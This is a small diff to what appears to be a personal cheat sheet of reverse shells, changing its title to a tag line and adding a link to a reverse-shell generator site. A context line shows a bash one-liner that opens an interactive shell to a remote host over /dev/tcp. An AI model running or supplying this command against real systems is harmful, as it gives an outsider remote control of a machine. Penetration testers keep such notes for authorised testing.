@@ -1,4 +1,4 @@
-## Reverse shells that actually worked during my travels
+__tags: reverse_shell tech
 
 ## Php
 
@@ -23,6 +23,7 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ## Reverse Shell Generator:
 
 https://github.com/mthbernardes/rsg
+https://www.revshells.com/
 
 ## Reverse shells:
 
